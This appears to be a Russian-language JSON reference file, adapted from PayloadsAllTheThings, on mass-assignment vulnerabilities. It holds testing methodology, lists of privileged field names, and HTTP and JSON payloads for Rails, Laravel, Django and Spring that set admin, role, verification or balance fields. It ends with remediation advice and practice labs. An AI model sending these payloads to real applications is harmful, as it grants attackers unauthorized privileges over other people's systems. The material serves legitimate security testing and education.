@@ -1,0 +1,146 @@
+{
+  "category": "Mass Assignment",
+  "source": "PayloadsAllTheThings/Mass Assignment/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое Mass Assignment",
+      "language": "text",
+      "tags": ["methodology", "mass-assignment"],
+      "body": "Mass Assignment (массовое присваивание, оно же Autobinding / Object Injection) — приложение автоматически переносит пользовательский ввод в свойства объекта программы. Уязвимость возникает, когда юзер может задать атрибуты, к которым не должен иметь доступа: права, роль, флаг администратора, баланс.\n\nЧаще всего встречается в приложениях на ORM, где свойства объекта обновляются разом из тела запроса, а не по одному. Такую функциональность дают популярные фреймворки: Ruby on Rails, Django, Laravel (PHP), Spring.\n\nПример: есть объект user с атрибутами username, email, password, isAdmin. Обычно через форму юзер меняет только username, email и password. Если сервер не проверяет, какие поля разрешено обновлять, атакующий добавляет в запрос isAdmin — и получает права администратора."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать и как тестировать",
+      "language": "text",
+      "tags": ["methodology", "recon", "authz"],
+      "body": "• Любые эндпоинты, которые создают или обновляют объект из тела запроса: регистрация, обновление профиля, настройки, создание заказа/комментария/поста, импорт.\n• Сначала сними «легитимный» ответ — какие поля сервер возвращает у объекта (id, role, isAdmin, verified, balance, owner_id, status). Эти же имена и пробуй слать обратно.\n• Источники имён скрытых полей: GET-ответ того же объекта, документация/Swagger/GraphQL-интроспекция, JS фронтенда, утёкшие схемы БД, чужие роли (создай админ-объект и сравни поля).\n• Заведи два аккаунта. Меняешь свой объект, добавляя привилегированное поле → перечитай объект и проверь, применилось ли.\n• Проверяй и create (POST), и update (PUT/PATCH): защита часто стоит только на одном из них.\n• Меняй формат тела: form-urlencoded ↔ JSON ↔ multipart ↔ XML — фильтр полей может работать не для всех."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Типичные привилегированные поля для подбора",
+      "language": "text",
+      "tags": ["methodology", "fields", "enumeration"],
+      "body": "Подставляй эти имена (и их варианты в snake_case / camelCase) к легитимным полям запроса:\n\n• Права/роль:   isAdmin, is_admin, admin, role, roles, role_id, group, group_id, permissions, is_staff, is_superuser, access_level, user_type\n• Доверие:      verified, is_verified, email_verified, confirmed, active, is_active, enabled, approved, status\n• Владение:     user_id, owner, owner_id, account_id, organization_id, tenant_id, created_by\n• Деньги:       balance, credit, credits, points, price, discount, is_premium, subscription, plan\n• Прочее:       id, uuid, password (чужой объект), reset_token, api_key"
+    },
+    {
+      "subcategory": "Привилегированные поля (JSON)",
+      "title": "Добавление isAdmin в JSON-тело",
+      "language": "json",
+      "tags": ["mass-assignment", "json", "privilege-escalation"],
+      "body": "{\n    \"username\": \"attacker\",\n    \"email\": \"attacker@email.com\",\n    \"password\": \"unsafe_password\",\n    \"isAdmin\": true\n}"
+    },
+    {
+      "subcategory": "Привилегированные поля (JSON)",
+      "title": "Повышение роли при обновлении профиля",
+      "language": "http",
+      "tags": ["mass-assignment", "json", "privilege-escalation"],
+      "body": "PATCH /api/users/me HTTP/1.1\nHost: vulnerable\nContent-Type: application/json\n\n{\n    \"email\": \"attacker@email.com\",\n    \"role\": \"admin\"\n}"
+    },
+    {
+      "subcategory": "Привилегированные поля (JSON)",
+      "title": "Самоверификация / активация аккаунта",
+      "language": "json",
+      "tags": ["mass-assignment", "json", "verified"],
+      "body": "{\n    \"email\": \"attacker@email.com\",\n    \"email_verified\": true,\n    \"is_active\": true,\n    \"status\": \"approved\"\n}"
+    },
+    {
+      "subcategory": "Привилегированные поля (form)",
+      "title": "Те же поля в form-urlencoded",
+      "language": "http",
+      "tags": ["mass-assignment", "form", "privilege-escalation"],
+      "body": "POST /users HTTP/1.1\nHost: vulnerable\nContent-Type: application/x-www-form-urlencoded\n\nusername=attacker&email=attacker%40email.com&password=unsafe_password&isAdmin=true"
+    },
+    {
+      "subcategory": "Привилегированные поля (form)",
+      "title": "Вложенные объекты через скобочную нотацию",
+      "language": "http",
+      "tags": ["mass-assignment", "form", "nested"],
+      "body": "username=attacker&user[role]=admin&user[isAdmin]=true&account[balance]=999999"
+    },
+    {
+      "subcategory": "Перебор скрытых полей",
+      "title": "Снять схему объекта из GET-ответа",
+      "language": "http",
+      "tags": ["recon", "enumeration", "fields"],
+      "body": "# 1. Прочитай свой объект — имена полей в ответе и есть кандидаты на инъекцию\nGET /api/users/me HTTP/1.1\nHost: vulnerable\n\n# Ответ раскрывает скрытые поля:\n# { \"id\": 17, \"username\": \"me\", \"role\": \"user\", \"isAdmin\": false, \"verified\": false }\n\n# 2. Отправь их обратно в update-запросе с нужными значениями\nPUT /api/users/me HTTP/1.1\nHost: vulnerable\nContent-Type: application/json\n\n{ \"role\": \"admin\", \"isAdmin\": true, \"verified\": true }"
+    },
+    {
+      "subcategory": "Перебор скрытых полей",
+      "title": "Идея перебора и источники имён",
+      "language": "text",
+      "tags": ["recon", "enumeration", "tips"],
+      "body": "Имя скрытого поля не угадаешь вслепую — собери словарь под цель:\n• GET-ответ того же объекта (самый частый источник).\n• Swagger/OpenAPI, WSDL, GraphQL-интроспекция, .map-файлы и JS фронтенда.\n• Ответы при ошибках валидации иногда перечисляют ожидаемые/неизвестные поля.\n• Создай объект под другой ролью (например, через админку демо-стенда) и сравни набор полей.\n• Перебирай Intruder'ом частые имена (role, is_admin, verified…) и следи, меняется ли объект после перечитывания."
+    },
+    {
+      "subcategory": "Ruby on Rails",
+      "title": "Rails — суть и эксплуатация",
+      "language": "text",
+      "tags": ["rails", "ruby", "mass-assignment"],
+      "body": "Rails переносит хеш params прямо в атрибуты модели (User.new(params[:user]), update(params[:user])). Защита — Strong Parameters: params.require(:user).permit(:email, :password). Если разработчик забыл permit или поставил permit!, любое поле модели присваивается.\n\nЭксплуатация: добавляешь к легитимным полям атрибут модели или колонку БД — admin, role, account_id.\n\nИсторически (Rails < 4, attr_accessible) этой брешью увели коммит-доступ к репозиториям GitHub."
+    },
+    {
+      "subcategory": "Ruby on Rails",
+      "title": "Rails — payload с вложенным user-хешем",
+      "language": "http",
+      "tags": ["rails", "ruby", "form"],
+      "body": "POST /users HTTP/1.1\nHost: vulnerable\nContent-Type: application/x-www-form-urlencoded\n\nuser[email]=attacker%40email.com&user[password]=Passw0rd!&user[admin]=true"
+    },
+    {
+      "subcategory": "Laravel (PHP)",
+      "title": "Laravel — суть и эксплуатация",
+      "language": "text",
+      "tags": ["laravel", "php", "mass-assignment"],
+      "body": "Eloquent присваивает массово через create()/fill()/update(). Защита у модели — $fillable (белый список) или $guarded (чёрный список). Опасные конфигурации:\n• $guarded = []; — разрешено присваивать ВСЁ.\n• Чувствительная колонка (is_admin, role_id) не попала ни в $guarded, ни вне $fillable.\n\nЭксплуатация: шлёшь имя колонки таблицы как обычное поле формы/JSON — Eloquent запишет его в модель."
+    },
+    {
+      "subcategory": "Laravel (PHP)",
+      "title": "Laravel — payload (колонка как обычное поле)",
+      "language": "http",
+      "tags": ["laravel", "php", "form"],
+      "body": "POST /register HTTP/1.1\nHost: vulnerable\nContent-Type: application/x-www-form-urlencoded\n\nname=attacker&email=attacker%40email.com&password=secret&is_admin=1&role_id=1"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Django — суть и эксплуатация",
+      "language": "text",
+      "tags": ["django", "python", "mass-assignment"],
+      "body": "В Django массовое присваивание прилетает через ModelForm и сериализаторы DRF (ModelSerializer). Опасно, когда поля задаются широко:\n• fields = '__all__' в Meta формы/сериализатора — в набор попадают и is_staff, is_superuser, is_active.\n• Нет read_only_fields для чувствительных колонок.\n\nЭксплуатация: добавляешь в JSON/форму поле модели, которое не должно быть редактируемым."
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Django — payload (DRF, поднятие до staff/superuser)",
+      "language": "json",
+      "tags": ["django", "python", "json"],
+      "body": "{\n    \"username\": \"attacker\",\n    \"email\": \"attacker@email.com\",\n    \"is_staff\": true,\n    \"is_superuser\": true,\n    \"is_active\": true\n}"
+    },
+    {
+      "subcategory": "Spring (Java)",
+      "title": "Spring MVC — суть и эксплуатация",
+      "language": "text",
+      "tags": ["spring", "java", "mass-assignment"],
+      "body": "Spring MVC автоматически биндит параметры запроса в поля command/DTO-объекта (data binding). Если контроллер принимает прямо сущность-модель и не ограничивает поля, атакующий задаёт любое свойство, включая привилегированные.\n\nОграничения задаются через @InitBinder с setAllowedFields()/setDisallowedFields(), DTO без чувствительных полей или @JsonIgnore. Их отсутствие = mass assignment.\n\nЭксплуатация: добавляешь имя поля сущности как обычный параметр запроса."
+    },
+    {
+      "subcategory": "Spring (Java)",
+      "title": "Spring — payload (биндинг привилегированного поля)",
+      "language": "http",
+      "tags": ["spring", "java", "form"],
+      "body": "POST /account/update HTTP/1.1\nHost: vulnerable\nContent-Type: application/x-www-form-urlencoded\n\nusername=attacker&email=attacker%40email.com&role=ADMIN&enabled=true"
+    },
+    {
+      "subcategory": "Защита",
+      "title": "Как чинить mass assignment",
+      "language": "text",
+      "tags": ["defense", "remediation"],
+      "body": "• Белый список разрешённых к привязке полей (allow-list), а не чёрный: Rails permit, Laravel $fillable, DRF fields=[...] + read_only_fields, Spring setAllowedFields/DTO.\n• Никогда не биндь запрос прямо в доменную модель — используй отдельный DTO/ViewModel только с теми полями, что юзеру можно менять.\n• Чувствительные поля (роль, флаги, владелец, баланс) выставляй только серверной логикой, не из ввода.\n• Не полагайся на сокрытие поля на фронтенде — проверяй на сервере.\n• Покрой тестами: попытка задать привилегированное поле должна игнорироваться или отклоняться."
+    },
+    {
+      "subcategory": "Лаборатории",
+      "title": "Где потренироваться",
+      "language": "text",
+      "tags": ["labs", "practice"],
+      "body": "• PentesterAcademy — Mass Assignment I (attackdefense, cid=1964)\n• PentesterAcademy — Mass Assignment II (attackdefense, cid=1922)\n• Root Me — API - Mass Assignment (root-me.org, Web-Server)"
+    }
+  ]
+}
